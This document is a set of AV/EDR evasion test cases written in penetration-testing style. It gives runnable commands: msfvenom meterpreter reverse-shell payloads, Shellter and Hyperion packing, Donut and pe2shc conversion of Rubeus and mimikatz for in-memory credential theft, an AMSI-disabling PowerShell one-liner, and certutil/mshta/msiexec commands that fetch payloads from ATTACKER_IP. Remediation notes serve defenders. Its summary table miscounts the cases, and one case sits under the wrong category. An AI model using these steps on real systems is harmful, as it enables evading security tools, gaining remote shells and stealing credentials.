# AV/EDR Evasion Test Cases

> Structured test cases covering payload generation, encoding, encryption, injection, conversion, and testing methodology. Each test case provides reproducible steps and clear pass/fail criteria.

---

## Statistics

| Category | Count | Severity Range |
|----------|-------|----------------|
| A. Payload Generation & Encoding | 2 | HIGH - CRITICAL |
| B. PE Injection & Framework Evasion | 1 | HIGH |
| C. Format Conversion | 2 | HIGH |
| D. Encryption | 1 | HIGH |
| **Total** | **6** | **HIGH - CRITICAL** |

---

## A. Payload Generation & Encoding

### TC-AV-001: Shellter PE Injection into Legitimate Binary

| Field | Value |
|------|-----|
| **ID** | TC-AV-001 |
| **Name** | Shellter PE Injection into Legitimate Binary |
| **Category** | A. Payload Generation & Encoding |
| **Severity** | HIGH |
| **Prerequisites** | Kali Linux with shellter installed (`apt install shellter`); a legitimate Windows PE binary (e.g., putty.exe, a Sysinternals tool); msfvenom listener or Metasploit handler ready; target Windows VM with AV/EDR for testing |
| **Test Steps** | 1. Copy a legitimate signed PE binary to the working directory: `cp /usr/share/windows-binaries/putty.exe ./putty_clean.exe`<br>2. Launch shellter in automatic mode: `shellter -a --file putty_clean.exe`<br>3. When prompted, select payload type: `windows/meterpreter/reverse_tcp`<br>4. Set LHOST to the attacker IP and LPORT to the listener port<br>5. Confirm injection succeeds (shellter reports injection point and status)<br>6. Verify the injected binary retains original functionality by executing it on a test Windows VM<br>7. Start a Metasploit multi/handler listener: `use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; exploit`<br>8. Execute the injected binary on the target VM and observe meterpreter session |
| **Expected Results (vulnerable)** | The injected binary bypasses target AV/EDR static detection; the original binary functionality is preserved (e.g., PuTTY opens normally); a meterpreter session is established back to the listener |
| **Expected Results (secure)** | Target AV/EDR detects and quarantines the injected binary before or during execution; no meterpreter session is established; behavioral alerts are triggered for suspicious injection patterns |
| **Remediation** | Deploy EDR with memory scanning capabilities that detect injected shellcode patterns; enable PE header anomaly detection; use file integrity monitoring for legitimate binaries; enforce application allowlisting |

### TC-AV-002: Veil Framework Payload Generation

| Field | Value |
|------|-----|
| **ID** | TC-AV-002 |
| **Name** | Veil Framework Payload Generation |
| **Category** | A. Payload Generation & Encoding |
| **Severity** | HIGH |
| **Prerequisites** | Veil framework installed (`apt install veil` or `git clone https://github.com/Veil-Framework/Veil.git`); msfvenom available; target Windows VM for testing |
| **Test Steps** | 1. Launch Veil evasion module: `veil -t Evasion`<br>2. List available payloads: `list` (note payload numbers 1-9+ for different languages)<br>3. Generate a PowerShell-based evasion payload: `use 1` then `set LHOST 10.0.0.1` and `set LPORT 4444` then `generate`<br>4. Generate a C#-based evasion payload: `use 2` with the same parameters<br>5. Record the output file paths for both payloads<br>6. Submit each payload to a test sandbox (any.run or Hybrid Analysis) and record detection rates<br>7. Execute each payload on a Windows VM with Windows Defender enabled and observe results |
| **Expected Results (vulnerable)** | At least one Veil payload evades Windows Defender real-time protection; the payload executes and establishes a reverse connection; sandbox detection rate is below 10/70 (on VirusTotal equivalent) |
| **Expected Results (secure)** | All Veil payloads are detected by Windows Defender or target AV; behavioral monitoring flags the execution pattern; sandbox detection rate is above 40/70 |
| **Remediation** | Keep AV signatures updated; enable behavioral and heuristic detection; deploy AMSI for PowerShell script scanning; use application control (AppLocker/WDAC) to restrict unauthorized executables |

### TC-AV-003: msfvenom Multi-Encoder Chain

| Field | Value |
|------|-----|
| **ID** | TC-AV-003 |
| **Name** | msfvenom Multi-Encoder Chain with Iteration Testing |
| **Category** | A. Payload Generation & Encoding |
| **Severity** | HIGH |
| **Prerequisites** | msfvenom installed (part of Metasploit framework); target Windows VM with AV for testing; ability to submit samples to sandbox |
| **Test Steps** | 1. Generate a baseline payload without encoding: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o baseline.exe`<br>2. Generate with single-encoder low iteration: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x64/xor_dynamic -i 1 -f exe -o enc_i1.exe`<br>3. Generate with single-encoder medium iteration: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o enc_i5.exe`<br>4. Generate with single-encoder high iteration: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x64/xor_dynamic -i 10 -f exe -o enc_i10.exe`<br>5. Generate with chained encoders: encode stage1 with shikata_ga_nai, then re-encode with xor_dynamic<br>6. Submit all 5 payloads to a test sandbox and record detection rates for each<br>7. Test each payload against Windows Defender on the target VM and record which are detected/quarantined<br>8. Compare detection rates across iteration counts and encoder combinations |
| **Expected Results (vulnerable)** | Multi-iteration (i=5+) and chained encoder payloads achieve lower detection rates than baseline; at least one encoded payload bypasses Windows Defender; detection rate decreases with iteration count |
| **Expected Results (secure)** | All payloads (including multi-iteration) are detected by AV; heuristic and behavioral detection catches encoded payloads regardless of iteration count |
| **Remediation** | Deploy AV with entropy-based heuristics that flag high-entropy PE sections; enable behavioral monitoring that detects meterpreter loader patterns regardless of encoding; use network-level detection for known C2 protocols |

---

## B. PE Injection & Framework Evasion

### TC-AV-004: Donut .NET Assembly to Shellcode Conversion

| Field | Value |
|------|-----|
| **ID** | TC-AV-004 |
| **Name** | Donut .NET Assembly to Shellcode Conversion |
| **Category** | C. Format Conversion |
| **Severity** | CRITICAL |
| **Prerequisites** | Donut installed (`git clone https://github.com/TheWover/donut && make`); a .NET post-exploitation assembly (e.g., Rubeus.exe, Seatbelt.exe); a shellcode loader or injection mechanism; target Windows VM with AV/EDR |
| **Test Steps** | 1. Convert a .NET assembly to shellcode with parameters: `donut -i Rubeus.exe -p "kerberoast" -o rubeus.bin`<br>2. Verify the output file is generated: `ls -la rubeus.bin` (note the file size)<br>3. Generate with AMSI + WDAC bypass enabled: `donut -i Rubeus.exe -p "kerberoast" -b 3 -o rubeus_bypass.bin`<br>4. Generate for x86 architecture: `donut -i Rubeus.exe -a 1 -o rubeus_x86.bin`<br>5. Load each shellcode variant using a shellcode loader (or inject into a remote process)<br>6. Observe whether the Rubeus kerberoast function executes and outputs TGS tickets<br>7. Check target AV/EDR for detection alerts related to the shellcode execution |
| **Expected Results (vulnerable)** | The donut-generated shellcode executes the .NET assembly in memory without touching disk; AV/EDR does not detect the execution because the assembly is loaded from a byte array (not a file); Rubeus kerberoast outputs service ticket hashes; AMSI bypass prevents script content scanning |
| **Expected Results (secure)** | EDR detects the in-memory assembly loading via ETW telemetry or memory scanning; AMSI bypass is detected and blocked; behavioral analysis flags the reflective loading pattern; no TGS tickets are extracted |
| **Remediation** | Enable ETW-based .NET assembly loading monitoring; deploy memory scanning that detects donut loader stubs; enable CLR (Common Language Runtime) logging to detect in-memory .NET assembly execution; use anti-tampering for AMSI components |

---

## C. Format Conversion

### TC-AV-005: pe2shc PE-to-Shellcode Conversion

| Field | Value |
|------|-----|
| **ID** | TC-AV-005 |
| **Name** | pe2shc PE-to-Shellcode Conversion |
| **Category** | C. Format Conversion |
| **Severity** | HIGH |
| **Prerequisites** | pe2shc installed (`git clone https://github.com/hasherezade/pe_to_shellcode && make`); a Windows PE executable to convert (e.g., mimikatz.exe, custom tool); a shellcode loader for testing; target Windows VM |
| **Test Steps** | 1. Convert a PE executable to shellcode: `pe2shc mimikatz.exe mimikatz.bin`<br>2. Verify the conversion output: pe2shc should report success with entry point and image base addresses<br>3. Check the output file size matches expectations: `ls -la mimikatz.bin`<br>4. Load the shellcode using a loader or injection mechanism on the target VM<br>5. Verify the converted tool executes correctly (e.g., mimikatz sekurlsa::logonpasswords output)<br>6. Compare detection rates between the original PE and the shellcode version |
| **Expected Results (vulnerable)** | The pe2shc-converted shellcode executes the original tool's functionality in memory; AV/EDR static detection is bypassed because the file is raw shellcode (not a PE); the tool produces expected output (e.g., credential dump) |
| **Expected Results (secure)** | EDR detects the shellcode execution via behavioral monitoring; memory scanning identifies known tool patterns (e.g., mimikatz function signatures); process injection alerts are triggered |
| **Remediation** | Deploy memory scanning that identifies known tool signatures in process memory; enable credential guard to protect against mimikatz-style attacks; use behavioral detection for process injection patterns; implement Credential Guard and LSA Protection |

---

## D. Encryption

### TC-AV-006: Hyperion AES Encryption Evasion

| Field | Value |
|------|-----|
| **ID** | TC-AV-006 |
| **Name** | Hyperion AES Encryption for PE Evasion |
| **Category** | D. Encryption |
| **Severity** | HIGH |
| **Prerequisites** | Hyperion installed (`apt install hyperion` or build from source); a PE payload to encrypt (generated from msfvenom or other tools); target Windows VM with AV for testing |
| **Test Steps** | 1. Generate a base payload: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o base.exe`<br>2. Encrypt the base payload with hyperion: `hyperion base.exe encrypted.exe`<br>3. Verify the encrypted file is generated: `ls -la encrypted.exe` (note size increase of approximately 50KB)<br>4. Check the entropy of both files using `ent base.exe` and `ent encrypted.exe` (encrypted should have significantly higher entropy)<br>5. Submit the unencrypted base.exe to a test sandbox and record detection rate<br>6. Submit encrypted.exe to the same sandbox and compare detection rates<br>7. Test encrypted.exe on the target Windows VM with AV real-time protection enabled<br>8. Verify the encrypted binary self-decrypts in memory and establishes a meterpreter session |
| **Expected Results (vulnerable)** | The hyperion-encrypted payload achieves a significantly lower detection rate than the unencrypted base (ideally below 10/70); Windows Defender does not detect the encrypted file at rest; the payload self-decrypts at runtime and establishes a reverse connection |
| **Expected Results (secure)** | AV detects the hyperion stub signature regardless of encrypted content; heuristic analysis flags the high-entropy PE sections; behavioral monitoring detects the self-decryption and injection pattern at runtime |
| **Remediation** | Enable entropy-based PE heuristics that flag abnormally high entropy sections; maintain signatures for known packer/encryption stubs (including hyperion); deploy behavioral monitoring that detects runtime self-decryption patterns; use sandbox analysis to observe decrypted payload behavior before allowing execution |

---

## E. AMSI and Script-Based Evasion

### TC-AV-007: AMSI Bypass Testing for PowerShell Payload Delivery

| Field | Value |
|------|-----|
| **ID** | TC-AV-007 |
| **Name** | AMSI Bypass Testing for PowerShell Payload Delivery |
| **Category** | E. AMSI and Script-Based Evasion |
| **Severity** | CRITICAL |
| **Prerequisites** | Windows 10/11 target with Windows Defender real-time protection enabled; PowerShell 5.1+ available; AMSI (Anti-Malware Scan Interface) active; attacker HTTP server hosting nishang/PowerSploit scripts |
- **Objective**: Verify whether AMSI bypass techniques allow execution of known-malicious PowerShell scripts that would otherwise be blocked by Windows Defender
- **Test Steps** | 1. Test baseline: attempt to execute known-malicious PowerShell command without bypass and confirm it is blocked by AMSI<br>2. Apply AMSI init-failed bypass: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`<br>3. Re-attempt the malicious command and verify it executes successfully<br>4. Test alternative memory-patching bypass against AmsiScanBuffer<br>5. Test forced garbage collection bypass: `[System.GC]::Collect()` between bypass and payload execution<br>6. Verify bypass effectiveness across PowerShell v5.1 and PowerShell Core v7+<br>7. Document which bypass techniques succeed and which are detected by Defender
- **Expected Results** | At least one AMSI bypass technique allows execution of previously blocked PowerShell content; the bypass persists for the current PowerShell session; subsequent script execution is not scanned by AMSI
- **Remediation** | Deploy EDR with ETW-based AMSI monitoring that detects bypass attempts; enable Credential Guard and tamper protection; use PowerShell Constrained Language Mode to limit script capabilities; monitor for AmsiScanBuffer patching attempts
- **Pass Criteria** | At least one bypass technique succeeds in disabling AMSI for the session; blocked PowerShell content executes after bypass; EDR/AV detection of the bypass attempt itself is documented

### TC-AV-008: Living-Off-the-Land Binary (LOLBin) Payload Execution

| Field | Value |
|------|-----|
| **ID** | TC-AV-008 |
| **Name** | Living-Off-the-Land Binary (LOLBin) Payload Execution |
| **Category** | E. AMSI and Script-Based Evasion |
| **Severity** | HIGH |
| **Prerequisites** | Windows target with standard system binaries; certutil, mshta, msiexec, and rundll32 available; attacker HTTP server hosting payloads; no application allowlisting in place
- **Objective**: Verify that LOLBin execution techniques bypass file-based AV detection by using signed, trusted Windows binaries to download and execute payloads
- **Test Steps** | 1. Test certutil download: `certutil -urlcache -split -f http://ATTACKER_IP/payload.exe payload.exe`<br>2. Test mshta execution: `mshta http://ATTACKER_IP/evil.hta`<br>3. Test msiexec execution: `msiexec /i http://ATTACKER_IP/payload.msi /quiet`<br>4. Test rundll32 execution: `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"` with embedded payload<br>5. Monitor AV/EDR for detection of each LOLBin execution attempt<br>6. Compare detection rates between LOLBin delivery and direct executable execution
- **Expected Results** | LOLBin techniques evade static file-based detection because the downloaded content is executed by trusted system binaries; at least one LOLBin technique bypasses real-time protection; detection is lower than direct executable execution
- **Remediation** | Deploy application allowlisting (AppLocker/WDAC); monitor certutil, mshta, and msiexec for network connections to external IPs; enable AMSI for script content scanning; restrict LOLBin execution via Group Policy
- **Pass Criteria** | At least one LOLBin technique successfully downloads and executes payload without AV quarantine; LOLBin detection rate is lower than direct execution; network-level detection opportunities are documented
